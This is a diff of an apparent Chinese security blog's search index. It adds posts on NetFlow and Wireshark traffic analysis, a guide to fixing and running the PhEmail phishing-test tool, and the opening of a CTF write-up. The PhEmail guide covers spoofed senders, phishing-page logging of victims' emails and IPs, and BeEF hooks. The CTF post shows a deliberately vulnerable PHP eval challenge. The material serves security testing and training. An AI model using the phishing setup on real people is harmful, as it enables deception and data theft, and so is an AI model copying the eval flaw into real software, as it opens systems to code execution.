@@ -328,6 +328,104 @@
       </tags>
   </entry>
   <entry>
+    <title>流量分析入门</title>
+    <url>/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><p>NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。<br><a id="more"></a></p>
+<h3 id="NetFlow输出格式"><a href="#NetFlow输出格式" class="headerlink" title="NetFlow输出格式"></a>NetFlow输出格式</h3><p>NetFlow输出格式为报头+一系列Flow流。报头包含序列号、记录数、系统时间等，Flow流包含IP地址、端口、路由信息等。</p>
+<p>一个IP数据包的Flow流至少定义了7个关键元素：</p>
+<ul>
+<li>源IP地址；</li>
+<li>目的IP地址；</li>
+<li>源端口号；</li>
+<li>目的端口号；</li>
+<li>第三层协议类型；</li>
+<li>TOS字段；</li>
+<li>网络设备输入/输出的逻辑端口。</li>
+</ul>
+<p>OSSIM提供可视化NetFlow图形界面，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/NetFlow.png" alt></p>
+<h3 id="NetFlow监测恶意代码"><a href="#NetFlow监测恶意代码" class="headerlink" title="NetFlow监测恶意代码"></a>NetFlow监测恶意代码</h3><p>NetFlow数据流获取方便，当网络正常运行时，NetFlow数据流是有一定的规律性的，当网络中存在异常流量时，网络流量会发生异常的波动。<br>监测蠕虫的策略：选取几个不同时间段，若时间段内符合特征的Flow超过上限值，则为病毒。</p>
+<h3 id="反应网络运行的核心参数"><a href="#反应网络运行的核心参数" class="headerlink" title="反应网络运行的核心参数"></a>反应网络运行的核心参数</h3><ul>
+<li>平均每秒流量：如果网络内部存在大流量的攻击或P2P等大流量的下载等异常流量时，其数值会比正常时大很多。</li>
+<li>平均每秒包数：大部分的异常流量都会产生非常多的数据包数。</li>
+<li>数据包大小分布：64字节左右的小包和1500字节左右的大包的分布比例较小，小包过多，可能存在扫描、攻击行为，大包过多可能存在消耗带宽资源的大包DOS攻击行为。<br>*平均包长：网络内的平均包长会在500-700字节左右。</li>
+<li>TCP会话数、UDP会话数、IP地址个数、MAC地址个数。。。</li>
+</ul>
+<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p> WireShark是目前世界上最流行的网络分析工具，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/WireShark.png" alt></p>
+<h3 id="界面详解"><a href="#界面详解" class="headerlink" title="界面详解"></a>界面详解</h3><p>1.过滤器规则：</p>
+<ul>
+<li>tcp-&gt;只显示TCP协议的记录；</li>
+<li>http-&gt;只看HTTP协议的记录；</li>
+<li>ip.src ==192.168.1.102 -&gt;显示源地址为192.168.1.102的记录；</li>
+<li>ip.dst==192.168.1.102 -&gt;目标地址为192.168.1.10的记录；</li>
+<li>ip.addr == 42.121.252.58 -&gt;只显示与某主机的通信；</li>
+<li>tcp.port ==80-&gt;端口为80的；</li>
+<li>tcp.srcport == 80 -&gt;只显示TCP协议的源端口为80的；</li>
+<li>http.request.method==”GET”  -&gt;只显示HTTP GET方法的；</li>
+<li>eth.type == 0x806-&gt;只显示ARP报文，这个字段的值表示是ARP报文，如果是ip报文此值为0x8000（可在表达式中选取对应的16进制值）。</li>
+</ul>
+<p>2.封包列表：<br>封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。</p>
+<p>3.封包的详细信息：<br>在封包信息中，每行对应的含义及在OSI模型中的对应关系如下：</p>
+<ul>
+<li>Frame:   物理层的数据帧概况  -&gt;对应OSI七层模型中的【物理层】</li>
+<li>Ethernet II: 数据链路层以太网帧头部信息  -&gt;对应OSI七层模型中的【数据链路层】</li>
+<li>Internet Protocol Version 4: 互联网层IP包头部信息  -&gt;对应OSI七层模型中的【网络层】</li>
+<li>Transmission Control Protocol:  传输层T的数据段头部信息，此处是TCP  -&gt;对应OSI七层模型中的【传输层】</li>
+<li>Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议  -&gt;对应OSI七层模型中的【应用层】</li>
+</ul>
+<h3 id="WireShark统计模块"><a href="#WireShark统计模块" class="headerlink" title="WireShark统计模块"></a>WireShark统计模块</h3><h4 id="捕获文件的属性"><a href="#捕获文件的属性" class="headerlink" title="捕获文件的属性"></a>捕获文件的属性</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/文件属性.PNG" alt><br>这一菜单简单收集所有抓包数据，在定义了过滤条件的时候，将呈现过滤后的数据。当想要知道每秒的平均报文数或是字节数时，可以使用此工具。</p>
+<h4 id="Endpoint"><a href="#Endpoint" class="headerlink" title="Endpoint"></a>Endpoint</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/统计_Endpoints.png" alt><br>此窗口中，能够看到第2,3,4层的endpoints，也就是以太网，IP, TCP或UDP。查看收发大量数据流的IP地址。</p>
+<h4 id="Conversations"><a href="#Conversations" class="headerlink" title="Conversations"></a>Conversations</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/Conversations.PNG" alt><br>显示2层以太网统计数据，第3层IP统计数据，或第4层TCP或UDP统计数据，网络会话是两个指定终端之间的数据流。例如，IP会话是两个IP地址之间的所有数据流，TCP会话包含了所有TCP连接。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Chilam007/p/6973990.html"> 抓包工具 - Wireshark（详细介绍与TCP三次握手数据分析）
+</a></p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>NetFlow</tag>
+        <tag>WireShark</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PhEmail:邮件钓鱼测试工具实际使用踩过的坑</title>
+    <url>/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<h2 id="PhEmail简介"><a href="#PhEmail简介" class="headerlink" title="PhEmail简介"></a>PhEmail简介</h2><p>PhEmail是基于python编写的一款网络钓鱼邮件测试工具。PhEmail可以同时向多个用户发送钓鱼邮件，并记录点击的用户的邮箱和IP等信息。PhEmail可以通过Google收集邮箱，完成邮箱收集工作。该工具可以用于公司内部邮箱钓鱼测试，可结合beef使用。</p>
+<p><strong>PhEmail项目主页：</strong><br><a href="https://github.com/Dionach/PhEmail">PhEmail钓鱼邮件工具</a><br><a id="more"></a></p>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="PhEmail帮助"><a href="#PhEmail帮助" class="headerlink" title="PhEmail帮助"></a>PhEmail帮助</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHishing EMAIL tool v0<span class="number">.13</span></span><br><span class="line">Usage: phemail.py [-e &lt;emails&gt;] [-m &lt;mail_server&gt;] [-f &lt;from_address&gt;] [-r &lt;replay_address&gt;] [-s &lt;subject&gt;] [-b &lt;body&gt;]</span><br><span class="line">          -e    emails: File containing list of emails (Default: emails.txt)</span><br><span class="line">          -f    from_address: Source email address displayed <span class="keyword">in</span> FROM field of the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -r    reply_address: Actual email address used to send the emails <span class="keyword">in</span> case that people reply to the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -s    subject: Subject of the email (Default: Newsletter)</span><br><span class="line">          -b    body: Body of the email (Default: body.txt)</span><br><span class="line">          -p    pages: Specifies number of results pages searched (Default: <span class="number">10</span> pages)</span><br><span class="line">          -v    verbose: Verbose Mode (Default: false)</span><br><span class="line">          -l    layout: Send email <span class="keyword">with</span> no embedded pictures</span><br><span class="line">          -B    BeEF: Add the hook <span class="keyword">for</span> BeEF</span><br><span class="line">          -m    mail_server: SMTP mail server to connect to</span><br><span class="line">          -g    Google: Use a google account username:password</span><br><span class="line">          -t    Time delay: Add deleay between each email (Default: <span class="number">3</span> sec)</span><br><span class="line">          -L    webserverLog: Customise the name of the webserver log file (Default: Date time <span class="keyword">in</span> format <span class="string">&quot;%d_%m_%Y_%H_%M&quot;</span>)</span><br><span class="line">          -S    Search: query on Google</span><br><span class="line">          -d    domain: of email addresses</span><br><span class="line">          -n    number: of emails per connection (Default: <span class="number">10</span> emails)</span><br><span class="line">          -c    clone: Clone a web page</span><br><span class="line">          -w    website: where the phishing email link points to</span><br><span class="line">          -o    save output <span class="keyword">in</span> a file</span><br><span class="line">          -F    Format (Default: <span class="number">0</span>):</span><br><span class="line">                <span class="number">0</span>- firstname surname</span><br><span class="line">                <span class="number">1</span>- firstname.surname@example.com</span><br><span class="line">                <span class="number">2</span>- firstnamesurname@example.com</span><br><span class="line">                <span class="number">3</span>- f.surname@example.com</span><br><span class="line">                <span class="number">4</span>- firstname.s@example.com</span><br><span class="line">                <span class="number">5</span>- surname.firstname@example.com</span><br><span class="line">                <span class="number">6</span>- s.firstname@example.com</span><br><span class="line">                <span class="number">7</span>- surname.f@example.com</span><br><span class="line">                <span class="number">8</span>- surnamefirstname@example.com</span><br><span class="line">                <span class="number">9</span>- firstname_surname@example.com</span><br><span class="line"></span><br><span class="line">Examples: phemail.py -e emails.txt -f <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -r <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -s <span class="string">&quot;Subject&quot;</span> -b body.txt</span><br><span class="line">          phemail.py -S example -d example.com -F <span class="number">1</span> -p <span class="number">12</span></span><br><span class="line">          phemail.py -c https://example.com</span><br></pre></td></tr></table></figure>
+<p>收集邮箱后钓鱼邮件发送常用参数：</p>
+<ul>
+<li>-e 收件人邮箱列表（列表内邮箱必须为同一域名）</li>
+<li>-f 发件人邮箱地址（伪造的邮箱不能与收件人邮箱在同一域名下）</li>
+<li>-r 收件人回复邮件时的接收邮箱，可采用临时邮箱</li>
+<li>-s 伪造的邮件主题</li>
+<li>-b 伪造的邮件内容文件，采用html编码，模板中采用href=”{0}”来代替url地址</li>
+<li>-w 钓鱼网站url地址，发送后会自动添加index.php?email=等内容</li>
+</ul>
+<h3 id="记录邮箱的方式"><a href="#记录邮箱的方式" class="headerlink" title="记录邮箱的方式"></a>记录邮箱的方式</h3><p>钓鱼邮件中的url链接伪造时添加email地址并进行编码，通过钓鱼网站中php文件代码来识别email并记录log文件中。php可以进行重定向到其他网站。</p>
+<h2 id="实际使用需要修改的地方"><a href="#实际使用需要修改的地方" class="headerlink" title="实际使用需要修改的地方"></a>实际使用需要修改的地方</h2><h3 id="BeautifulSoup问题"><a href="#BeautifulSoup问题" class="headerlink" title="BeautifulSoup问题"></a>BeautifulSoup问题</h3><p>安装BeautifulSoup后，运行程序时会报BeautifulSoup问题。</p>
+<ol>
+<li>可以将源代码中如下位置的注释切换<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/beautifulsoup4.PNG" alt><br>修改为如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">    <span class="comment">#from bs4 import BeautifulSoup</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;No BeautifulSoup installed&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>不修改注释，将所有调用BeautufulSoup的函数的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx)</span><br></pre></td></tr></table></figure>
+修改为：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx,<span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>邮件在使用中文时出现中文乱码，需要修改phemail.py内容进行调整。</p>
+<h4 id="邮件标题乱码"><a href="#邮件标题乱码" class="headerlink" title="邮件标题乱码"></a>邮件标题乱码</h4><p>在导入包时添加如下内容<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure><br>对邮件标题进行unicode编码，在发送邮件时添加如下代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(SUBJECT):</span><br><span class="line">      SUBJECT = unicode(SUBJECT,unicode)</span><br><span class="line">msg[<span class="string">&#x27;subject&#x27;</span>] = SUBJECT</span><br></pre></td></tr></table></figure></p>
+<h4 id="邮件内容乱码"><a href="#邮件内容乱码" class="headerlink" title="邮件内容乱码"></a>邮件内容乱码</h4><p>添加如下代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg[<span class="string">&quot;Accept-Language&quot;</span>]=<span class="string">&quot;zh-CN&quot;</span></span><br><span class="line">msg[<span class="string">&quot;Accept-Charset&quot;</span>]=<span class="string">&quot;ISO-8859-1,utf-8&quot;</span></span><br></pre></td></tr></table></figure><br>并将<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>))</span><br></pre></td></tr></table></figure><br>修改为<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
+<h3 id="index-php内容修改"><a href="#index-php内容修改" class="headerlink" title="index.php内容修改"></a>index.php内容修改</h3><h4 id="修改域名"><a href="#修改域名" class="headerlink" title="修改域名"></a>修改域名</h4><p>修改位置在index.php中有提示：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/change_domain.PNG" alt><br>将其中的dionach.com修改为收件人邮箱的域名。</p>
+<h4 id="修改重定向"><a href="#修改重定向" class="headerlink" title="修改重定向"></a>修改重定向</h4><p>在index.php末尾存在重定向方法，可以将此url改为你想要重定向的url，如www.baidu.com<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/重定向.PNG" alt></p>
+<h4 id="修改记录log文件保存位置"><a href="#修改记录log文件保存位置" class="headerlink" title="修改记录log文件保存位置"></a>修改记录log文件保存位置</h4><p>index.php中将log文件保存在/tmp目录中，若使用windows搭建网站服务，则不存在/tmp目录,直接将log文件保存在当前目录，删除下面代码中的”/tmp/“<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log文件位置.PNG" alt></p>
+<h2 id="整理log日志"><a href="#整理log日志" class="headerlink" title="整理log日志"></a>整理log日志</h2><p>若收件人点击后php获取了如下一系列信息：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log信息.PNG" alt><br>若存在多个文件，并想提取其中的email地址，并去重，于是写了一个小脚本进行提取email去重：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)&quot;</span></span><br><span class="line"></span><br><span class="line">filepth = sys.argv[<span class="number">1</span>]</span><br><span class="line">file = os.listdir(filepth)</span><br><span class="line">allinemail = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">with</span> open(filepth+filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        emails = re.findall(regex,f.read())</span><br><span class="line">        allemail = list(set(emails))</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> allemail:</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> allinemail:</span><br><span class="line">                allinemail.append(e)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;email_result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    <span class="keyword">for</span> email <span class="keyword">in</span> allinemail:</span><br><span class="line">        w.write(email+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">w.close()</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>PhEmail</tag>
+        <tag>邮件钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo博客迁移到其他电脑</title>
     <url>/2018/08/03/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%B5%E8%84%91/</url>
     <content><![CDATA[<h2 id="备份原文件"><a href="#备份原文件" class="headerlink" title="备份原文件"></a>备份原文件</h2><p>需要转移的文件有：</p>
@@ -422,101 +520,75 @@
       </tags>
   </entry>
   <entry>
-    <title>PhEmail:邮件钓鱼测试工具实际使用踩过的坑</title>
-    <url>/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
-    <content><![CDATA[<h2 id="PhEmail简介"><a href="#PhEmail简介" class="headerlink" title="PhEmail简介"></a>PhEmail简介</h2><p>PhEmail是基于python编写的一款网络钓鱼邮件测试工具。PhEmail可以同时向多个用户发送钓鱼邮件，并记录点击的用户的邮箱和IP等信息。PhEmail可以通过Google收集邮箱，完成邮箱收集工作。该工具可以用于公司内部邮箱钓鱼测试，可结合beef使用。</p>
-<p><strong>PhEmail项目主页：</strong><br><a href="https://github.com/Dionach/PhEmail">PhEmail钓鱼邮件工具</a><br><a id="more"></a></p>
-<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="PhEmail帮助"><a href="#PhEmail帮助" class="headerlink" title="PhEmail帮助"></a>PhEmail帮助</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHishing EMAIL tool v0<span class="number">.13</span></span><br><span class="line">Usage: phemail.py [-e &lt;emails&gt;] [-m &lt;mail_server&gt;] [-f &lt;from_address&gt;] [-r &lt;replay_address&gt;] [-s &lt;subject&gt;] [-b &lt;body&gt;]</span><br><span class="line">          -e    emails: File containing list of emails (Default: emails.txt)</span><br><span class="line">          -f    from_address: Source email address displayed <span class="keyword">in</span> FROM field of the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -r    reply_address: Actual email address used to send the emails <span class="keyword">in</span> case that people reply to the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -s    subject: Subject of the email (Default: Newsletter)</span><br><span class="line">          -b    body: Body of the email (Default: body.txt)</span><br><span class="line">          -p    pages: Specifies number of results pages searched (Default: <span class="number">10</span> pages)</span><br><span class="line">          -v    verbose: Verbose Mode (Default: false)</span><br><span class="line">          -l    layout: Send email <span class="keyword">with</span> no embedded pictures</span><br><span class="line">          -B    BeEF: Add the hook <span class="keyword">for</span> BeEF</span><br><span class="line">          -m    mail_server: SMTP mail server to connect to</span><br><span class="line">          -g    Google: Use a google account username:password</span><br><span class="line">          -t    Time delay: Add deleay between each email (Default: <span class="number">3</span> sec)</span><br><span class="line">          -L    webserverLog: Customise the name of the webserver log file (Default: Date time <span class="keyword">in</span> format <span class="string">&quot;%d_%m_%Y_%H_%M&quot;</span>)</span><br><span class="line">          -S    Search: query on Google</span><br><span class="line">          -d    domain: of email addresses</span><br><span class="line">          -n    number: of emails per connection (Default: <span class="number">10</span> emails)</span><br><span class="line">          -c    clone: Clone a web page</span><br><span class="line">          -w    website: where the phishing email link points to</span><br><span class="line">          -o    save output <span class="keyword">in</span> a file</span><br><span class="line">          -F    Format (Default: <span class="number">0</span>):</span><br><span class="line">                <span class="number">0</span>- firstname surname</span><br><span class="line">                <span class="number">1</span>- firstname.surname@example.com</span><br><span class="line">                <span class="number">2</span>- firstnamesurname@example.com</span><br><span class="line">                <span class="number">3</span>- f.surname@example.com</span><br><span class="line">                <span class="number">4</span>- firstname.s@example.com</span><br><span class="line">                <span class="number">5</span>- surname.firstname@example.com</span><br><span class="line">                <span class="number">6</span>- s.firstname@example.com</span><br><span class="line">                <span class="number">7</span>- surname.f@example.com</span><br><span class="line">                <span class="number">8</span>- surnamefirstname@example.com</span><br><span class="line">                <span class="number">9</span>- firstname_surname@example.com</span><br><span class="line"></span><br><span class="line">Examples: phemail.py -e emails.txt -f <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -r <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -s <span class="string">&quot;Subject&quot;</span> -b body.txt</span><br><span class="line">          phemail.py -S example -d example.com -F <span class="number">1</span> -p <span class="number">12</span></span><br><span class="line">          phemail.py -c https://example.com</span><br></pre></td></tr></table></figure>
-<p>收集邮箱后钓鱼邮件发送常用参数：</p>
-<ul>
-<li>-e 收件人邮箱列表（列表内邮箱必须为同一域名）</li>
-<li>-f 发件人邮箱地址（伪造的邮箱不能与收件人邮箱在同一域名下）</li>
-<li>-r 收件人回复邮件时的接收邮箱，可采用临时邮箱</li>
-<li>-s 伪造的邮件主题</li>
-<li>-b 伪造的邮件内容文件，采用html编码，模板中采用href=”{0}”来代替url地址</li>
-<li>-w 钓鱼网站url地址，发送后会自动添加index.php?email=等内容</li>
-</ul>
-<h3 id="记录邮箱的方式"><a href="#记录邮箱的方式" class="headerlink" title="记录邮箱的方式"></a>记录邮箱的方式</h3><p>钓鱼邮件中的url链接伪造时添加email地址并进行编码，通过钓鱼网站中php文件代码来识别email并记录log文件中。php可以进行重定向到其他网站。</p>
-<h2 id="实际使用需要修改的地方"><a href="#实际使用需要修改的地方" class="headerlink" title="实际使用需要修改的地方"></a>实际使用需要修改的地方</h2><h3 id="BeautifulSoup问题"><a href="#BeautifulSoup问题" class="headerlink" title="BeautifulSoup问题"></a>BeautifulSoup问题</h3><p>安装BeautifulSoup后，运行程序时会报BeautifulSoup问题。</p>
+    <title>CTF一道web题小结-无数字字母getFlag()</title>
+    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
 <ol>
-<li>可以将源代码中如下位置的注释切换<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/beautifulsoup4.PNG" alt><br>修改为如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">    <span class="comment">#from bs4 import BeautifulSoup</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;No BeautifulSoup installed&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>不修改注释，将所有调用BeautufulSoup的函数的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx)</span><br></pre></td></tr></table></figure>
-修改为：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx,<span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure>
-</li>
+<li>长度不能大于35</li>
+<li>不能存在数字字母_和$符号</li>
 </ol>
-<h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>邮件在使用中文时出现中文乱码，需要修改phemail.py内容进行调整。</p>
-<h4 id="邮件标题乱码"><a href="#邮件标题乱码" class="headerlink" title="邮件标题乱码"></a>邮件标题乱码</h4><p>在导入包时添加如下内容<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure><br>对邮件标题进行unicode编码，在发送邮件时添加如下代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(SUBJECT):</span><br><span class="line">      SUBJECT = unicode(SUBJECT,unicode)</span><br><span class="line">msg[<span class="string">&#x27;subject&#x27;</span>] = SUBJECT</span><br></pre></td></tr></table></figure></p>
-<h4 id="邮件内容乱码"><a href="#邮件内容乱码" class="headerlink" title="邮件内容乱码"></a>邮件内容乱码</h4><p>添加如下代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg[<span class="string">&quot;Accept-Language&quot;</span>]=<span class="string">&quot;zh-CN&quot;</span></span><br><span class="line">msg[<span class="string">&quot;Accept-Charset&quot;</span>]=<span class="string">&quot;ISO-8859-1,utf-8&quot;</span></span><br></pre></td></tr></table></figure><br>并将<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>))</span><br></pre></td></tr></table></figure><br>修改为<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
